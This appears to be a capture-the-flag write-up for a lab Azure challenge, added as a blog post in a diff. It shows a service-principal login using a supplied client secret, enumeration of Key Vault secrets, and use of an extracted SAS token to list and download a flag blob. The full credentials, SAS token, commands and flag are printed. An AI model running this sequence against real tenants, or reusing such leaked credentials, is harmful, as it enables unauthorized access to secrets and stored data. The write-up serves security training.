@@ -1,0 +1,197 @@
+---
+title: CWL - Vaulted Keys and Hidden Blobs
+date: '2026-02-20'
+tags: ['cyberwarfarelabs', 'cloud', 'Azure', 'azure-cli', 'key-vault']
+draft: false
+summary:  The challenge provides Client Credentials that can be used to authenticate and enumerate available Key Vaults and secrets. Then, using an acquired SAS Token, the flag was retrieved from a blob in a storage container belonging to a storage account
+images: /static/images/cyberwarfare/cloud/vaultedkeys/vaultedkeys.png
+---
+
+
+<div className="flex justify-center">
+	<img src="/static/images/cyberwarfare/cloud/vaultedkeys/vaultedkeys.png" alt="Description" />
+</div>
+
+
+
+<div className="flex justify-center">
+	<img src="/static/images/cyberwarfare/cloud/vaultedkeys/vaultedkeys2.png" alt="Description" />
+</div>
+
+
+
+<TOCInline toc={props.toc} asDisclosure />
+
+
+
+---
+
+
+## Starting Point
+
+We are provided the following credentials:
+
+![Description](/static/images/cyberwarfare/cloud/vaultedkeys/1.png)
+
+
+
+
+## Authenticating into Azure
+
+
+
+### Retrieving the Tenant ID
+
+First, we need the Tenant ID, we can use the `AADInternals` PowerShell library for this. We need to import the library first
+
+```PowerShell
+Import-Module AADInternals
+```
+
+![Description](/static/images/cyberwarfare/cloud/vaultedkeys/2.png)
+
+
+Make an API call by invoking the `Get-AADIntTenantID` function
+
+```PowerShell
+PS> Get-AADIntTenantID -Domain secure-corp.org
+f2a33211-e46a-4c92-b84d-aff06c2cd13f
+```
+
+
+### Login as Service Principal
+
+
+Now, we will login as login as service principal. This is because there is no real dedicated email we can use to login. A service principal
+acts as a non-human identity similar to a service account, not tied to any particular user.
+
+
+```bash
+az login --service-principal --username 76e1a895-1f05-4165-83ab-98eed07bed86 --password 6LU8Q~OjXfR3z8ZTOHqd0MpE8r1bGs0qStavaacZ --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
+```
+
+If we get this JSON response, it means the login was successful
+
+```json
+[
+  {
+    "cloudName": "AzureCloud",
+    "homeTenantId": "f2a33211-e46a-4c92-b84d-aff06c2cd13f",
+    "id": "662a4fee-a3ba-49b3-9caf-8c20ed04503f",
+    "isDefault": true,
+    "managedByTenants": [],
+    "name": "Prod",
+    "state": "Enabled",
+    "tenantId": "f2a33211-e46a-4c92-b84d-aff06c2cd13f",
+    "user": {
+      "name": "76e1a895-1f05-4165-83ab-98eed07bed86",
+      "type": "servicePrincipal"
+    }
+  }
+]
+```
+
+
+## Enumerating Key Vaults
+
+Since the flow of the challenge requires us to look into key vaults we will do just that. List all Key Vaults
+
+```bash
+az keyvault list
+```
+
+![Description](/static/images/cyberwarfare/cloud/vaultedkeys/3.png)
+
+
+
+Only 1 Key Vault is present, `secopprobackkv`. Let's try to list keys and secrets in the Key Vault
+
+
+```bash
+az keyvault key list --vault-name secopprobackkv
+```
+
+![Description](/static/images/cyberwarfare/cloud/vaultedkeys/4.png)
+
+
+```bash
+az keyvault secret list --vault-name secopprobackkv
+```
+
+![Description](/static/images/cyberwarfare/cloud/vaultedkeys/5.png)
+
+
+
+We failed to retrieve keys but there is a secret name called `secopprobacksaSAASToken`. We can use this to get the secret value
+
+```bash
+az keyvault secret show --vault-name secopprobackkv --name secopprobacksaSAASToken
+```
+
+![Description](/static/images/cyberwarfare/cloud/vaultedkeys/6.png)
+
+
+This secret value is also a Shared Access Signature (SAS) token which provide secure, delegated access to resources in Azure storage accounts. We could use this
+token to find containers and blobs
+
+
+
+
+
+
+## Enumerating Storage Accounts, Containers and Blobs
+
+
+Using the SAS Token, we could enumerate for storage accounts
+
+
+```bash
+az storage account list
+```
+
+![Description](/static/images/cyberwarfare/cloud/vaultedkeys/7.png)
+
+
+
+The storage account name is `secopprobacksa`. Now we find the container name
+
+
+```bash
+az storage container list --account-name secopprobacksa --sas-token "sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D"
+```
+
+![Description](/static/images/cyberwarfare/cloud/vaultedkeys/8.png)
+
+
+From the container, we can list down available blobs
+
+```bash
+az storage blob list --container-name secopprobacksc --account-name secopprobacksa --sas-token "sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D"
+```
+
+
+```JSON
+...
+    "isAppendBlobSealed": null,
+    "isCurrentVersion": null,
+    "lastAccessedOn": null,
+    "metadata": {},
+    "name": "Flag.txt",
+    "objectReplicationDestinationPolicy": null,
+    "objectReplicationSourceProperties": [],
+    "properties":
+...
+```
+
+
+Looks like our flag in the blob, proceed to download it
+
+```bash
+az storage blob download --container-name secopprobacksc --account-name secopprobacksa --sas-token "sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D" --name Flag.txt
+```
+
+
+```bash
+Finished[#############################################################]  100.0000%
+CWL{Azure_KeyVau!t_H@cker}
+```
